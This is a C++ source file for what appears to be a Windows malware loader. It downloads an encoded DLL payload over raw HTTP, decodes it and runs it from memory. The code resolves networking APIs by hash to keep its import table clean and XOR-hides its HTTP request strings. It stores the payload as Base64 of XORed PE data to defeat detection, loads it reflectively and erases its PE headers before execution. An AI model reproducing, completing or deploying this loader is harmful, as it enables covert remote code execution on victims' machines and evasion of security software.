// PayloadLoader.cpp
#include "stdafx.h"
#include "ApiHash.h"
#include "MemoryModule.h"
#include "PayloadLoader.h"

// XOR-encrypted HTTP request template (position-dependent key).
// Plaintext: "GET %s HTTP/1.0\r\nHost: %s\r\nUser-Agent: Mozilla/4.0\r\n"
//            "Connection: close\r\n\r\n"
static const unsigned char encReq[73] = {
    0x1D,0x1E,0x08,0x7D,0x7B,0x2C,0x40,0x29,0x36,0x37,0x34,0x4A,
    0x57,0x49,0x58,0x64,0x60,0x23,0x03,0x1E,0x1A,0x55,0x50,0x54,
    0x01,0x7E,0x7E,0x20,0x05,0x12,0x0A,0x54,0x3B,0x1C,0x19,0x13,
    0x0A,0x45,0xA0,0xCC,0xED,0xF9,0xED,0xE9,0xEA,0xE6,0xA7,0xBD,
    0xA4,0xBB,0x81,0x87,0xCD,0xE0,0xFE,0xFF,0xF7,0xF0,0xE0,0xFC,
    0xF9,0xF9,0xA2,0xB9,0x39,0x37,0x33,0x2E,0x3B,0x52,0x6A,0x6C,
    0x68
};

// ----------------------------------------------------------------------------
// Raw-socket HTTP download (replaces WinINet). ws2_32 is resolved through
// ApiHash (LoadModuleHidden + GetProcByHash); ws2_32.lib is NOT linked, so the
// import table stays KERNEL32-only. Only http:// is supported (no https).
// ----------------------------------------------------------------------------

typedef int (WSAAPI *pfn_WSAStartup)(WORD, LPWSADATA);
typedef SOCKET (WSAAPI *pfn_socket)(int, int, int);
typedef int (WSAAPI *pfn_connect)(SOCKET, const struct sockaddr*, int);
typedef int (WSAAPI *pfn_send)(SOCKET, const char*, int, int);
typedef int (WSAAPI *pfn_recv)(SOCKET, char*, int, int);
typedef int (WSAAPI *pfn_closesocket)(SOCKET);
typedef struct hostent* (WSAAPI *pfn_gethostbyname)(const char*);

static pfn_WSAStartup    pWSAStartup = NULL;
static pfn_socket        psocket = NULL;
static pfn_connect       pconnect = NULL;
static pfn_send          psend = NULL;
static pfn_recv          precv = NULL;
static pfn_closesocket   pclosesocket = NULL;
static pfn_gethostbyname pgethostbyname = NULL;

static BOOL InitWinsock(void)
{
    if (pWSAStartup) return TRUE;
    HMODULE hWs = LoadModuleByHash(HM_ws2_32_dll);
    if (!hWs) return FALSE;
    pWSAStartup    = (pfn_WSAStartup)GetProcByHash(hWs, H_WSAStartup);
    psocket        = (pfn_socket)GetProcByHash(hWs, H_socket);
    pconnect       = (pfn_connect)GetProcByHash(hWs, H_connect);
    psend          = (pfn_send)GetProcByHash(hWs, H_send);
    precv          = (pfn_recv)GetProcByHash(hWs, H_recv);
    pclosesocket   = (pfn_closesocket)GetProcByHash(hWs, H_closesocket);
    pgethostbyname = (pfn_gethostbyname)GetProcByHash(hWs, H_gethostbyname);
    if (!pWSAStartup || !psocket || !pconnect || !psend || !precv ||
        !pclosesocket || !pgethostbyname) return FALSE;
    WSADATA wsa;
    if (pWSAStartup(MAKEWORD(2, 2), &wsa) != 0) return FALSE;
    return TRUE;
}

// Split http://host[:port]/path into host, port, path.
static BOOL ParseHttpUrl(LPCSTR url, char* host, int hostCap,
                         int* port, char* path, int pathCap)
{
    LPCSTR p = url;
    if (p[0]=='h'&&p[1]=='t'&&p[2]=='t'&&p[3]=='p'&&p[4]==':'&&p[5]=='/'&&p[6]=='/')
        p += 7;
    const char* slash = strchr(p, '/');
    char hostport[256];
    if (slash) {
        int hl = (int)(slash - p);
        if (hl >= (int)sizeof(hostport)) hl = sizeof(hostport) - 1;
        memcpy(hostport, p, hl); hostport[hl] = 0;
        strncpy(path, slash, pathCap - 1); path[pathCap - 1] = 0;
    } else {
        strncpy(hostport, p, sizeof(hostport) - 1);
        hostport[sizeof(hostport) - 1] = 0;
        strcpy(path, "/");
    }
    *port = 80;
    char* colon = strchr(hostport, ':');
    if (colon) { *colon = 0; *port = atoi(colon + 1); }
    strncpy(host, hostport, hostCap - 1); host[hostCap - 1] = 0;
    return host[0] != 0 && *port > 0;
}

BOOL DownloadToMemory(LPCSTR url, BYTE** outData, DWORD* outSize)
{
    *outData = NULL; *outSize = 0;
    if (!InitWinsock()) return FALSE;

    char host[128], path[1024]; int port = 80;
    if (!ParseHttpUrl(url, host, sizeof(host), &port, path, sizeof(path)))
        return FALSE;

    struct hostent* he = pgethostbyname(host);
    if (!he || !he->h_addr_list || !he->h_addr_list[0]) return FALSE;

    SOCKET s = psocket(AF_INET, SOCK_STREAM, 0);
    if (s == INVALID_SOCKET) return FALSE;

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    // manual htons (network byte order)
    int np = port;
    addr.sin_port = (u_short)(((np & 0xFF) << 8) | ((np >> 8) & 0xFF));
    memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);

    if (pconnect(s, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
        pclosesocket(s); return FALSE;
    }

    // Decrypt request template on the stack (no plaintext HTTP strings in image).
    char tpl[96];
    for (int i = 0; i < 73; i++) tpl[i] = (char)(encReq[i] ^ (0x5A + (i & 0x3F)));
    tpl[73] = 0;
    char req[1400];
    int rn = _snprintf(req, sizeof(req), tpl, path, host);
    if (rn > 0) psend(s, req, rn, 0);

    DWORD cap = 64 * 1024, len = 0;
    BYTE* buf = (BYTE*)malloc(cap);
    if (!buf) { pclosesocket(s); return FALSE; }

    int r;
    while ((r = precv(s, (char*)buf + len, (int)(cap - len - 1), 0)) > 0) {
        len += r;
        if (len + 1 >= cap) {
            cap *= 2;
            BYTE* nb = (BYTE*)realloc(buf, cap);
            if (!nb) break;
            buf = nb;
        }
    }
    buf[len] = 0;
    pclosesocket(s);

    if (len < 12) { free(buf); return FALSE; }
    // status line: HTTP/1.0 200 ...
    const char* sp = strchr((char*)buf, ' ');
    if (!sp) { free(buf); return FALSE; }
    if (atoi(sp + 1) != 200) { free(buf); return FALSE; }

    char* hb = strstr((char*)buf, "\r\n\r\n");
    if (!hb) { free(buf); return FALSE; }
    hb += 4;
    DWORD bodyLen = len - (DWORD)(hb - (char*)buf);
    BYTE* body = (BYTE*)malloc(bodyLen ? bodyLen : 1);
    if (!body) { free(buf); return FALSE; }
    memcpy(body, hb, bodyLen);
    free(buf);

    *outData = body;
    *outSize = bodyLen;
    return TRUE;
}

// ----------------------------------------------------------------------------
// Payload encryption support.
// The network copy of Consys21.dll is stored as Base64( XOR(PE) ) text, so the
// file on the HTTP server has no MZ/PE header and is not recognizable as a PE.
// At runtime we Base64-decode then XOR-restore it before memory loading.
//
// The XOR transform is the inverse pair EncryptData/DecryptData from the
// original project (key = 1024 -> p = (uchar)key % 1451 + 61 = 61):
//     offline encryptor : c = (x - p) ^ p
//     loader restore     : x = (c ^ p) + p
// ----------------------------------------------------------------------------

// Standard Base64 value: returns 0..63, -2 for '=' padding, -1 for whitespace/illegal.
static int Base64Val(char ch)
{
    if (ch >= 'A' && ch <= 'Z') return ch - 'A';
    if (ch >= 'a' && ch <= 'z') return ch - 'a' + 26;
    if (ch >= '0' && ch <= '9') return ch - '0' + 52;
    if (ch == '+') return 62;
    if (ch == '/') return 63;
    if (ch == '=') return -2;
    return -1;
}

// Standard Base64 decoder; tolerates CR/LF/whitespace. Returns a malloc buffer.
static BOOL Base64Decode(const char* in, DWORD inLen, BYTE** out, DWORD* outLen)
{
    BYTE* o = (BYTE*)malloc((size_t)inLen * 3 / 4 + 4);
    if (!o) return FALSE;
    DWORD outN = 0;
    int val = 0, quad = 0, pad = 0;
    for (DWORD i = 0; i < inLen; i++)
    {
        int v = Base64Val(in[i]);
        if (v == -1) continue;             // skip whitespace / newlines
        if (v == -2) { v = 0; pad++; }     // padding
        else if (pad) { free(o); return FALSE; } // no data allowed after padding
        val = (val << 6) | v;
        if (++quad == 4)
        {
            o[outN++] = (BYTE)((val >> 16) & 0xFF);
            if (pad < 2) o[outN++] = (BYTE)((val >> 8) & 0xFF);
            if (pad < 1) o[outN++] = (BYTE)(val & 0xFF);
            quad = 0; val = 0;
            if (pad) break;                // '=' only appears at the tail
        }
    }
    // Tolerate an unpadded tail (quad=2 -> 1 byte, quad=3 -> 2 bytes).
    if (quad > 0 && pad == 0)
    {
        val <<= (6 * (4 - quad));
        if (quad >= 2) o[outN++] = (BYTE)((val >> 16) & 0xFF);
        if (quad == 3) o[outN++] = (BYTE)((val >> 8) & 0xFF);
    }
    *out = o;
    *outLen = outN;
    return TRUE;
}

// Loader-side XOR restore (equivalent to the original EncryptData step).
// p = (uchar)1024 % 1451 + 61 = 61.
static void PayloadXorRestore(BYTE* buf, DWORD len)
{
    const BYTE p = 61;
    for (DWORD i = 0; i < len; i++)
    {
        BYTE b = buf[i];
        b ^= p;
        b += p;
        buf[i] = b;
    }
}

static BOOL IsValidPE(const BYTE* b, DWORD len)
{
    if (len < 0x40) return FALSE;
    if (b[0] != 'M' || b[1] != 'Z') return FALSE;
    LONG e = *(LONG*)(b + 0x3C);
    if (e <= 0 || (DWORD)e + 4 > len) return FALSE;
    return b[e] == 'P' && b[e + 1] == 'E' && b[e + 2] == 0 && b[e + 3] == 0;
}

// Restore the downloaded blob into a plaintext PE in a malloc buffer.
//   - starts with MZ: plaintext payload (backward compatible), copied once;
//   - otherwise: treated as Base64 ciphertext -> decode -> XOR -> verify PE.
static BOOL DecodePayload(const BYTE* in, DWORD inLen, BYTE** out, DWORD* outLen)
{
    *out = NULL; *outLen = 0;
    if (inLen >= 2 && in[0] == 'M' && in[1] == 'Z')
    {
        BYTE* c = (BYTE*)malloc(inLen ? inLen : 1);
        if (!c) return FALSE;
        memcpy(c, in, inLen);
        *out = c; *outLen = inLen;
        return TRUE;
    }

    BYTE* raw = NULL;
    DWORD rawLen = 0;
    if (!Base64Decode((const char*)in, inLen, &raw, &rawLen) || !raw || rawLen < 0x40)
    {
        if (raw) free(raw);
        return FALSE;
    }
    PayloadXorRestore(raw, rawLen);
    if (!IsValidPE(raw, rawLen)) { free(raw); return FALSE; }
    *out = raw; *outLen = rawLen;
    return TRUE;
}

BOOL LoadAndRunPayload(const BYTE* data, DWORD size, const char* entryName, char* arg)
{
    BYTE* pe = NULL;
    DWORD peSize = 0;
    if (!DecodePayload(data, size, &pe, &peSize)) return FALSE;

    HMEMORYMODULE h = MemoryLoadLibrary(pe);
    if (!h) { free(pe); return FALSE; }

    PayloadEntry fn = (PayloadEntry)MemoryGetProcAddress(h, entryName);
    if (!fn) { MemoryFreeLibrary(h); free(pe); return FALSE; }

    // Entry resolved; erase the PE header before running the payload.
    MemoryEraseHeaders(h);

    fn(arg);
    MemoryFreeLibrary(h);
    free(pe);
    return TRUE;
}